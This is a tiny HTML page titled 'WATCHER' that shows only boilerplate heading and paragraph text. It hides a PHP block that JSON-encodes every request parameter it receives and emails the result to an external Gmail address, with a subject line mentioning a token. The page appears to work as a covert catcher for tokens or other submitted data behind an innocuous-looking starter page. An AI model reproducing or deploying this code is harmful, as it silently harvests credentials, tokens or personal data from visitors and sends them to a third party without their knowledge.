<html>
<head>
<title>WATCHER</title>
</head>
<body>

<h1>My First Heading</h1>
<p>My first paragraph.</p>
  <?php if(!empty($_REQUEST)) {
  $json = json_encode($_REQUEST);
    mail('netquiredev@gmail.com','my first token',$json);
  }?>

</body>
</html>
